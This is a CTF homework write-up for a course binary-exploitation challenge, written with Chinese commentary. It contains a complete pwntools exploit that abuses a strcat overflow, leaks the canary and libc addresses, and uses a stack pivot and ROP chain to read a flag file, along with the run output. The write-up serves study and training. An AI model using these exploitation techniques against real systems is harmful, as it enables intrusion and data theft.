---
title: Simple PWN 0x37(2023 HW - HACHAMA)
tags: [eductf, CTF, PWN]

category: "Security/Course/NTU CS/PWN"
---

# Simple PWN 0x37(2023 HW - HACHAMA)
<!-- more -->

## Background
stack pivot
rop
bof

## Source code
:::spoiler Source Code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "SECCOMP.h"

long n;
char msg[0x20];
long n2;

struct sock_filter seccompfilter[]={
	BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField),
	BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
	BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
	BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum),
	Allow(open),
	Allow(openat),
	Allow(read),
	Allow(write),
	Allow(close),
	Allow(readlink),
	Allow(getdents),
	Allow(getrandom),
	Allow(brk),
	Allow(rt_sigreturn),
	Allow(exit),
	Allow(exit_group),
	BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog filterprog={
	.len=sizeof(seccompfilter)/sizeof(struct sock_filter),
	.filter=seccompfilter
};

void apply_seccomp(){
	if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){
		perror("Seccomp Error");
		exit(1);
	}
	if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&filterprog)==-1){
		perror("Seccomp Error");
		exit(1);
	}
	return;
}

int main(void)
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	apply_seccomp();
	char buf2[0x30];
	// long n2 = 0x30;
	// char msg[0x20];
	char name[0x20];
	// long n = 20;
	n2 = 0x30;
	n = 20;
	printf("Haaton's name? ");
	n = read(0, name, n);
	name[n] = 0;
	strcpy(msg, name);
	strcat(msg, " hachamachama");
	puts(msg);
	puts("ECHO HACHAMA!");
	while (1)
	{
		read(0, buf2, n2);
		if (strcmp(buf2, "HACHAMA") == 0)
			write(1, buf2, n2);
		else
			break;
	}
	return 0;
}

```
:::

## Recon
:::warning
切記題目用read接，所以不需要null byte做結尾，另外題目使用的libc是ubuntu 22.04.2的版本，所以可以用docker把libc資料撈出來，再針對這個做應用
:::
這一題我覺得出的很好，有很特別的exploit，也需要用到很多前兩周學會的幾乎所有技能，包含BOF / return 2 libc / stack pivot / ROP等等

1. ==**漏洞在哪裡???**==
    首先，乍看之下會不知道這個洞在哪裡，不過多try幾次或是跟一下動態會發現，他做的事情會蓋到原本==n2==的數值，導致我們之後可以輸入更多的東西
    詳細來說就是:
    因為在#61的地方輸入的東西被存到local variable name，而在#63會被copy到global variable ==msg==，並且和` hachamachama`合併在一起，如果一開始我們輸入的東西是20個字元，而concatenate的` hachamachama`總共13個字元，加起來就已經是==33==個字元，但如下圖所示，msg一開始的大小就被限制在32 bytes，也就是說他會蓋到後面n2的值
    ![圖片](https://hackmd.io/_uploads/HyUsSOTBT.png)
    從下圖可以看出來，因為長度超過的關係，原本`hachamachama`的最後一個字元，也就是0x61往後蓋到n2的值，這代表我們在往後的地方可以多加利用
    ![圖片](https://hackmd.io/_uploads/SJUTP_aBT.png)

2. 知道漏洞在哪裡之後，我們就可以利用這個洞，把stack的東西leak出來
    ```python
    payload = b'HACHAMA'.ljust(0x8, b'\x00')
    r.send(payload)
    result = r.recv(0x61)
    log.info("[-------------Stack Info-------------]")
    for i in range(12):
        log.info(hex(u64(result[i * 8:i * 8 + 8])))
    log.info("[-------------Stack Info-------------]")

    canary = u64(result[7 * 8:7 * 8 + 8])
    libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80
    libc_base_addr = libc_start_main - 0x29d90 + 0x80
    main_fn_addr = u64(result[11 * 8:11 * 8 + 8])
    code_segment_base = main_fn_addr - 0x331

    log.success(f'Canary = {hex(canary)}')
    log.success(f'libc start main base = {hex(libc_start_main)}')
    log.success(f'libc base addr = {hex(libc_base_addr)}')
    log.success(f'Main Function Address = {hex(main_fn_addr)}')
    log.success(f'Code Segment = {hex(code_segment_base)}')
    ```
3. 有了canary / libc base 和code segment base / main function address，就可以來搞事了，初步的想法是直接寫一個open / read / write的syscall(因為seccomp的關係導致我們的操作極其有限)，不過因為我們也只是多了0x31的空間可以寫ROP，代表一定沒辦法把所有的shellcode都寫上去，這時候就需要用到stack pivot的技術，開一個相對大的空間繼續我們的作業，但就像@ccccc說的
    > stack pivot只是把你的stack用到其他地方而已，並不會因為你換了stack的位置你就能overflow比較多

    所以比較正確的觀念是，我先利用多出來的0x31把可以用的空間開大，再寫gadget，會比較方便，如果是像lab那樣每一個步驟都切成一個stack pivot的話也不現實，因為一個操作所需要的空間一定大於0x31，隨便舉個例子，如果是open→`fd = open("/home/chal/flag.txt", 0);`，全部的payload如下:
    ```python
    payload = b'/home/chal/flag.txt'.ljust(0x38, b'\x00')
    payload += flat(
        canary,
        0,
        pop_rax_ret, 2,
        pop_rdi_ret, bss_addr_flag - 0x40,
        pop_rdx_rbx_ret, 0, 0,
        pop_rsi_ret, 0,
        syscall_ret
    )
    ```
    最少也需要0x98的空間，所以擴大可以寫的空間是必要的，但我還是稍微嘮叨一下，一開始我的想法是直接把n2的數值改掉，這樣就可以解決上述的問題，但實際操作會發現這也不現實，因為payload也會過長，如下
    ```python
    payload = b'a' * 0x38
    payload += flat(
        canary,
        rbp,
        pop_rdi_ret, n2_addr,
        pop_rdx_ret, 0x200,
        mov_qword_ptr_rdi_rdx_ret,
        main_fn_addr + 291,
    )
    ```
    這樣最少也需要0x78的空間，比起最大值的0x61還差蠻多的，所以昨天就想了超久怎麼解決這個問題
3. 解決空間大小的問題
    這個要回到動態實際執行的時候是怎麼呼叫的(如下圖)，這一題有趣的地方在這邊，理論上我們是回到main+291，讓他fetch n2的值給RAX，但如果我直接跳到main+298，並且利用rop把rax變大，是不是也有一樣的效果
    ![圖片](https://hackmd.io/_uploads/Syoe0OTHp.png)
    ```python
    extend_payload = flat(
        canary,
        bss_addr_flag,
        pop_rax_ret, 400,
        main_fn_addr + 298,
    )
    ```
    此時我們就不需要那麼多的gadget幫助完成該目標


4. 剩下的open / read / write就和lab差不多

:::success
截至目前為止，我們的流程是
1. 設法利用overflow改變n2的數值，使我們能夠輸入更多shell code
2. 先利用第一次的write輸入stack上的重要資訊
3. 因為n2空間還是太小，所以我們需要先擴大能夠寫入的空間，也就是先利用第一次的stack pivot把shellcode寫上去→main+291
4. 執行shellcode後，使rax變大再跳回去main+298
5. 寫入真正的open / read / write讀出flag
:::

:::warning
注意事項:
1. canary
    因為他有開stack protection，所以一定要對好canary在stack上的位置，可以用動態去看，依照這一題的狀況，他是會在rbp+0x40的地方
2. libc version
    這一題因為要leak libc的base address，並且利用ROP gadget達到syscall的目的，所以一定要確定remote server使用的版本是哪一個，光知道大的版本號是有可能會失敗的，因為像我local端到最後有成功，但跑在remote就爛掉了，和@david學長討論過後的結果就是libc version有問題，實際用docker去看彼此的差異就會發現，右邊是我的→22.04.3，而左邊是實際remote的docker開出來的結果→22.04.2，所以我的作法是把docker中的東西拉出來再使用，包含在local端使用以及找gadget
    ![圖片](https://hackmd.io/_uploads/ByiMMYTHa.png)
    ```bash
    $ docker cp /lib/x86_64-linux-gnu/libc.so.6 /mnt/d/Downloads/
    ```
3. IO problem
    這個問題也是很弔詭，會發現我在最後一個send之前還有一個raw_input()，如果拿掉的話在remote一樣會爛掉，這有可能是IO之類的問題，但總之一定要加
:::

## Exploit - BOF + Stack Pivot + ROP

```python
from pwn import *

r = process('./chal', env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('10.113.184.121', 10056)
context.arch = 'amd64'


# Try to trigger length exploit
payload = b'a' * 20
r.sendafter(b"Haaton's name? ", payload)
print(r.recvlines(2))

# Leak stack info
payload = b'HACHAMA'.ljust(0x8, b'\x00')
r.send(payload)
result = r.recv(0x61)
log.info("[-------------Stack Info-------------]")
for i in range(12):
    log.info(hex(u64(result[i * 8:i * 8 + 8])))
log.info("[-------------Stack Info-------------]")

canary = u64(result[7 * 8:7 * 8 + 8])
libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80
libc_base_addr = libc_start_main - 0x29d90 + 0x80
main_fn_addr = u64(result[11 * 8:11 * 8 + 8])
code_segment_base = main_fn_addr - 0x331

log.success(f'Canary = {hex(canary)}')
log.success(f'libc start main base = {hex(libc_start_main)}')
log.success(f'libc base addr = {hex(libc_base_addr)}')
log.success(f'Main Function Address = {hex(main_fn_addr)}')
log.success(f'Code Segment = {hex(code_segment_base)}')

# Prepare ROP gadget
pop_rax_ret = libc_base_addr + 0x0000000000045eb0# : pop rax ; ret
pop_rdi_ret = libc_base_addr + 0x000000000002a3e5# : pop rdi ; ret
pop_rsi_ret = libc_base_addr + 0x000000000002be51# : pop rsi ; ret
pop_rdx_ret = libc_base_addr + 0x00000000000796a2# : pop rdx ; ret
pop_rdx_rbx_ret = libc_base_addr + 0x0000000000090529# : pop rdx ; pop rbx ; ret
syscall_ret = libc_base_addr + 0x0000000000091396# : syscall ; ret

bss_addr = code_segment_base + 0x3000 + 0x200
bss_addr_flag = bss_addr + 0x400
bss_addr_buf = bss_addr_flag + 0x120

file_addr = b'/home/chal/flag.txt'.ljust(0x38, b'\x00')

trash_payload = flat(
    canary,
    bss_addr,
    main_fn_addr + 291
)

extend_payload = flat(
    canary,
    bss_addr_flag,
    pop_rax_ret, 400,
    main_fn_addr + 298,
)

open_payload = flat(
    # Open file
    # fd = open("/home/chal/flag.txt", 0);
    pop_rax_ret, 2,
    pop_rdi_ret, bss_addr_flag - 0x40,
    pop_rdx_rbx_ret, 0, 0,
    pop_rsi_ret, 0,
    syscall_ret
)

read_payload = flat(
    # Read the file
    # read(fd, buf, 0x30);
    pop_rax_ret, 0,
    pop_rdi_ret, 3, 
    pop_rsi_ret, bss_addr_buf,
    pop_rdx_rbx_ret, 0x70, 0,
    syscall_ret
)

write_payload = flat(
    # Write the file
    # write(1, buf, 0x30);
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    # pop_rsi_ret, bss_addr_buf,
    # pop_rdx_ret, 0x70,
    syscall_ret
)

# Extend rbp space
r.send(b'a' * 0x38 + trash_payload)
r.send(b'a' * 0x38 + extend_payload)

# Write Exploit ROP gadget
raw_input()
r.send(file_addr + p64(canary) + p64(0) + open_payload + read_payload + write_payload)

r.interactive()
```

```bash
$ python exp.py
[+] Starting local process './chal': pid 5857
[+] Opening connection to 10.113.184.121 on port 10056: Done
[b'aaaaaaaaaaaaaaaaaaaa hachamachama', b'ECHO HACHAMA!']
[*] [-------------Stack Info-------------]
[*] 0x414d4148434148
[*] 0x0
[*] 0x0
[*] 0x0
[*] 0x0
[*] 0x0
[*] 0x0
[*] 0x2be6a8b7acfcbc00
[*] 0x1
[*] 0x7fef436ccd90
[*] 0x0
[*] 0x560ff1bf4331
[*] [-------------Stack Info-------------]
[+] Canary = 0x2be6a8b7acfcbc00
[+] libc start main base = 0x7fef436ccd10
[+] libc base addr = 0x7fef436a3000
[+] Main Function Address = 0x560ff1bf4331
[+] Code Segment = 0x560ff1bf4000

[*] Switching to interactive mode
flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&index=1}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Segmentation fault
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to 10.113.184.121 port 10056
[*] Stopped process './chal' (pid 5857)
```

Flag: `flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&index=1}`